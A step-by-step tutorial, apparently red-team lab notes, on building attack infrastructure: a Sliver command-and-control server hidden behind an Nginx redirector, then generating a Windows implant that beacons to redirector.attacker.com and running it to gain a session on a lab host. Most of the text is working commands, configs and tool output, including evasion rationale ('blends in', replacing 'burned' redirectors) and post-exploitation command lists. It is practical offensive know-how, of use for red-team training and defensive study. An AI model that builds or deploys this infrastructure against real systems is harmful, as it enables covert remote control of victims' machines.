## Goals

- Build & c2 server
- Build & configure redirector
- Get a shell

### Prereq
- x2 VPS
- x2 domains

## Setup

### c2 server
- System: Ubuntu 21.10
- DNS: c2.attacker.com
- Sliver: v1.5.4

### Redirector
- System: Ubuntu 21.10
- DNS: redirector.attacker.com

## Install

### c2

#### Golang

```
cd /opt && mkdir golang && cd golang
wget https://go.dev/dl/go1.17.6.linux-amd64.tar.gz
rm -rf /usr/local/go && tar -C /usr/local -xzf go1.17.6.linux-amd64.tar.gz
echo -n 'export PATH=$PATH:/usr/local/go/bin:/root/go/bin/' >> ~/.zshrc
zsh
go version
```

#### Metasploit

**TODO** You'll want this for sliver implant generation.

```
mkdir /opt/msf && cd /opt/msf
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```

#### Sliver

```
apt install mingw-w64 certbot ufw -y 
cd /opt && mkdir sliver && cd sliver
wget https://github.com/BishopFox/sliver/releases/download/v1.5.4/sliver-server_linux
chmod +x sliver-server_linux
```

### Redirector

#### Apt

```
apt install nginx certbot -y
```

## Configure

### c2

#### Goals
- We want to expose Sliver to only the redirector
- We want to configure SSL communications

#### Firewall

Initially only SSH exposed:

```
$ ufw status
Status: active

To                         Action      From
--                         ------      ----
22                         ALLOW       Anywhere                  
22 (v6)                    ALLOW       Anywhere (v6)
```

**TODO** sliver has functionality to attempt to do this on the fly.

Temporarily open 80/tcp for letsencrypt:

```
ufw allow 80/tcp
```

Obtain SSL certificate:

```
certbot certonly --agree-tos --standalone -m webmaster@vaultsec.xyz -d c2.attacker.com
```

Close 80/tcp:

```
$ ufw status numbered
Status: active                                                                      
                                                                                    
     To                         Action      From                 
     --                         ------      ----                 
[ 1] 22                         ALLOW IN    Anywhere                  
[ 2] 80/tcp                     ALLOW IN    Anywhere                  
[ 3] 22 (v6)                    ALLOW IN    Anywhere (v6)             
[ 4] 80/tcp (v6)                ALLOW IN    Anywhere (v6

$ ufw delete 2                                                                                                                
2022-02-10 03:05:16 GMT
  
Deleting:     
 allow 80/tcp
Proceed with operation (y|n)? y                                                     
Rule deleted

$ ufw status numbered
Status: active

     To                         Action      From
     --                         ------      ----
[ 1] 22                         ALLOW IN    Anywhere                  
[ 2] 22 (v6)                    ALLOW IN    Anywhere (v6)             
[ 3] 80/tcp (v6)                ALLOW IN    Anywhere (v6)

$ ufw delete 3       
Deleting:
 allow 80/tcp
Proceed with operation (y|n)? y
Rule deleted (v6)

$ ufw status
Status: active

To                         Action      From
--                         ------      ----
22                         ALLOW       Anywhere                  
22 (v6)                    ALLOW       Anywhere (v6)
```

Allow communications from only the redirector:

```
$ ufw allow from 53.148.16.72 to any proto tcp port 443
Rule added

$ ufw status
Status: active

To                         Action      From
--                         ------      ----
22                         ALLOW       Anywhere                  
443/tcp                    ALLOW       53.148.16.72             
22 (v6)                    ALLOW       Anywhere (v6)
```

#### Sliver Listener

Start sliver:

```
$ cd /opt/sliver

$ ./sliver-server_linux
```

##### Command Crash Course
- `help`
- `jobs`
- `https`

1. Run each
2. Run each with `-h`

##### Create the Listener

Help:

```
[server] sliver > https -h

Start an HTTPS listener

Usage:
======
  https [flags]

Flags:
======
  -c, --cert              string    PEM encoded certificate file
  -D, --disable-otp                 disable otp authentication
  -d, --domain            string    limit responses to specific domain
  -h, --help                        display help
  -k, --key               string    PEM encoded private key file
  -e, --lets-encrypt                attempt to provision a let's encrypt certificate
  -L, --lhost             string    interface to bind server to
  -J, --long-poll-jitter  string    server-side long poll jitter (default: 2s)
  -T, --long-poll-timeout string    server-side long poll timeout (default: 1s)
  -l, --lport             int       tcp listen port (default: 443)
  -p, --persistent                  make persistent across restarts
  -t, --timeout           int       command timeout in seconds (default: 60)
  -w, --website           string    website name (see websites cmd)
```

Start:

```
[server] sliver > https --cert /etc/letsencrypt/live/c2.attacker.com/cert.pem --key /etc/letsencrypt/live/c2.attacker.com/privkey.pem --domain c2.attacker.com --lhost 0.0.0.0 --lport 443 --persistent

[*] Starting HTTPS c2.attacker.com:443 listener ...

[*] Successfully started job #1

[server] sliver > jobs

 ID   Name    Protocol   Port 
==== ======= ========== ======
 1    https   tcp        443
```

> Note, double checking listening services with `ss -ltnp` shows `*:443` is listening. However, using `curl` we see it cannot be reached from a system other than the redirector. Good :)

### Redirector

#### Goals
- We want to expose Nginx, not sliver (Nginx is common and blends in, sliver less so)
- We want to configure SSL communications
- We want to configure Nginx to forward *specific* requests to the sliver c2 server

Initially only SSH exposed:

```
$ ufw status
Status: active

To                         Action      From
--                         ------      ----
22                         ALLOW       Anywhere                  
22 (v6)                    ALLOW       Anywhere (v6)
```

Open HTTP and HTTPS:

```
ufw allow 80/tcp
ufw allow 443/tcp
```

Obtain SSL certificate:

```
systemctl stop nginx.service
certbot certonly --agree-tos --standalone -m webmaster@attacker.com -d redirector.attacker.com
```

Write Nginx site configuration:

```
# /etc/nginx/sites-available/redir.conf
server {
    listen 443;
    server_name redirector.attacker.com;

    ssl on;
    ssl_certificate /etc/letsencrypt/live/redirector.attacker.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/redirector.attacker.com/privkey.pem;

    root /var/www/html-dl;

    location /content {
        proxy_pass https://c2.attacker.com ;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    location /assets {
        proxy_pass https://c2.attacker.com ;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

Configure Nginx:

```
mkdir -p /var/www/html-dl
rm /etc/nginx/sites-enabled/default
ln -s /etc/nginx/sites-available/redir.conf /etc/nginx/sites-enabled
```

Optional:
- Place content in the web root (e.g. Wordpress, Bootstrap/HTML5 templates, etc)

Test:
- Head to [https://redirector.attacker.com](https://redirector.attacker.com) to ensure Nginx is serving the site with no issue

## Shellz

### Status
- c2 server built and setup with sliver installed and protected with firewall
- sliver setup with SSL communications and listening
- redirector server built and setup with SSL communications
- Nginx configured to forward specified requests to sliver

### Implants

Help:

```
Usage:
======
  generate [flags]

Flags:
======
  -a, --arch               string    cpu architecture (default: amd64)
  -c, --canary             string    canary domain(s)
  -d, --debug                        enable debug features
  -n, --dns                string    dns connection strings
  -e, --evasion                      enable evasion features
  -f, --format             string    Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe)
  -h, --help                         display help
  -b, --http               string    http(s) connection strings
  -X, --key-exchange       int       wg key-exchange port (default: 1337)
  -w, --limit-datetime     string    limit execution to before datetime
  -x, --limit-domainjoined           limit execution to domain joined machines
  -F, --limit-fileexists   string    limit execution to hosts with this file in the filesystem
  -z, --limit-hostname     string    limit execution to specified hostname
  -y, --limit-username     string    limit execution to specified username
  -k, --max-errors         int       max number of connection errors (default: 1000)
  -m, --mtls               string    mtls connection strings
  -N, --name               string    agent name
  -p, --named-pipe         string    named-pipe connection strings
  -o, --os                 string    operating system (default: windows)
  -P, --poll-timeout       int       long poll request timeout (default: 360)
  -j, --reconnect          int       attempt to reconnect every n second(s) (default: 60)
  -s, --save               string    directory/file to the binary to
  -l, --skip-symbols                 skip symbol obfuscation
  -T, --tcp-comms          int       wg c2 comms port (default: 8888)
  -i, --tcp-pivot          string    tcp-pivot connection strings
  -t, --timeout            int       command timeout in seconds (default: 60)
  -g, --wg                 string    wg connection strings

Sub Commands:
=============
  beacon  Generate a beacon binary
  info    Get information about the server's compiler
  stager  Generate a stager using Metasploit (requires local Metasploit installation)
```

Generate:

```
[server] sliver > generate --http redirector.attacker.com/content --http redirector.attacker.com/assets

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 00:02:42
[*] Implant saved to /opt/sliver/DIFFICULT_CATSUP.exe
```

> Note, this takes a minute or, two ...

We can specify multiple connection strings. Including the paths from our redirector:

```
# /etc/nginx/sites-available/redir.conf
    [...]
    location /content {
    [...]
    location /assets {
    [...]
```

To view generated implants, use `implants`:

```
[server] sliver > implants 

 Name               Implant Type   OS/Arch             Format   Command & Control                                      Debug 
================== ============== =============== ============ ====================================================== =======
 DIFFICULT_CATSUP   session        windows/amd64   EXECUTABLE   [1] https://redirector.attacker.com/assets   false
```

The implant will be located at `/opt/sliver/DIFFICULT_CATSUP.exe`:

```
ls -lh /opt/sliver/DIFFICULT_CATSUP.exe 
 
-rwx------ 1 root root 16M Feb 10 03:35 /opt/sliver/DIFFICULT_CATSUP.exe
```

### Detonate

Download the implant to your nearest Windows system, then execute:

```
> .\DIFFICULT_CATSUP.exe
```

Back on the sliver server:

```
[server] sliver > 

[*] Session 20e7afe7 DIFFICULT_CATSUP - tcp(53.148.16.72:52954)->53.142.247.31 (lab) - windows/amd64 - Thu, 10 Feb 2022 03:50:38 UTC

[server] sliver > sessions

 ID         Name               Transport   Remote Address                            Hostname   Username       Operating System   Last Check-In                   Health  
========== ================== =========== ========================================= ========== ============== ================== =============================== =========
 20e7afe7   DIFFICULT_CATSUP   http(s)     tcp(53.148.16.72:52954)->53.142.247.31   lab      LAB\victim   windows/amd64      Thu, 10 Feb 2022 03:50:43 UTC   [ALIVE]
```

Checking the redirector's Nginx logs `/var/log/nginx/access.log`:

```
53.142.247.31 - - [10/Feb/2022:03:50:06 +0000] "POST /assets/database/api.html?i=9146492g4&nz=01278318 HTTP/1.1" 200 856 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.6132.934 Safari/537.36"
53.142.247.31 - - [10/Feb/2022:03:50:06 +0000] "POST /assets/samples.php?s=10800365 HTTP/1.1" 202 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.6132.934 Safari/537.36"
53.142.247.31 - - [10/Feb/2022:03:50:08 +0000] "GET /assets/assets/jscript/umd/assets/jscript/bundles/app.min.js?e=1c009g46461 HTTP/1.1" 204 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.6132.934 Safari/537.36"
[...]
```

Our implant is speaking to the c2 server through the redirector. Once the redirector is burned, a new one can be spawned without having to setup another c2 server and sliver instance!

### Interact

To view sessions:

```
sessions
```

To kill sessions, `-k <session id>` or, `-K` to kill all sessions.

To interact with a session, we can use `use`. Enter the first character or two of the session ID and use tab to complete:

```
[server] sliver > use 20e7afe7-3dd7-4c85-9ccc-2d2d1f4c056d

[*] Active session DIFFICULT_CATSUP (20e7afe7-3dd7-4c85-9ccc-2d2d1f4c056d)

[server] sliver (DIFFICULT_CATSUP) > info

        Session ID: 20e7afe7-3dd7-4c85-9ccc-2d2d1f4c056d
              Name: DIFFICULT_CATSUP
          Hostname: lab
              UUID: c0e44d56-4ad5-78dd-3655-063fa9b53bf2
          Username: lab\victim
               UID: S-1-5-21-1012798714-27252290-1774702337-1000
               GID: S-1-5-21-1012798714-27252290-1774702337-513
               PID: 732
                OS: windows
           Version: 10 build 19042 x86_64
              Arch: amd64
         Active C2: https://redirector.attacker.com/assets
    Remote Address: tcp(53.148.16.72:52954)->53.142.247.31
         Proxy URL: 
Reconnect Interval: 1m0s

[server] sliver (DIFFICULT_CATSUP) > whoami

LAB\victim
```

Using `help` once again, we get platform specific implant commands too:

```
Sliver - Windows:                   
=================                                                                   
  backdoor          Infect a remote file with a sliver shellcode       
  dllhijack         Plant a DLL for a hijack scenario
  execute-assembly  Loads and executes a .NET assembly in a child process (Windows Only)
  getprivs          Get current privileges (Windows only)
  getsystem         Spawns a new sliver session as the NT AUTHORITY\SYSTEM user (Windows Only)
  impersonate       Impersonate a logged in user.         
  make-token        Create a new Logon Session with the specified credentials
  migrate           Migrate into a remote process                              
  psexec            Start a sliver service on a remote target
  registry          Windows registry operations
  rev2self          Revert to self: lose stolen Windows token
  runas             Run a new process in the context of the designated user (Windows Only)
  spawndll          Load and execute a Reflective DLL in a remote process
```

In addition, there is now also general session help:

```
Sliver:
=======
  cat                Dump file to stdout
  cd                 Change directory
  close              Close an interactive session without killing the remote process
  download           Download a file
  execute            Execute a program on the remote system
  execute-shellcode  Executes the given shellcode in the sliver process
  extensions         Manage extensions
  getgid             Get session process GID
  getpid             Get session pid
  getuid             Get session process UID
  ifconfig           View network interface configurations
  info               Get info about session
  interactive        Task a beacon to open an interactive session (Beacon only)
  kill               Kill a session
  ls                 List current directory
  mkdir              Make a directory
  msf                Execute an MSF payload in the current process
  msf-inject         Inject an MSF payload into a process
  netstat            Print network connection information
  ping               Send round trip message to implant (does not use ICMP)
  pivots             List pivots for active session
  portfwd            In-band TCP port forwarding
  procdump           Dump process memory
  ps                 List remote processes
  pwd                Print working directory
  reconfig           Reconfigure the active session
  rm                 Remove a file or directory
  screenshot         Take a screenshot
  shell              Start an interactive shell
  sideload           Load and execute a shared object (shared library/DLL) in a remote process
  socks5             In-band SOCKS5 Proxy
  ssh                Run a SSH command on a remote host
  terminate          Terminate a process on the remote system
  upload             Upload a file
  whoami             Get session user execution context
```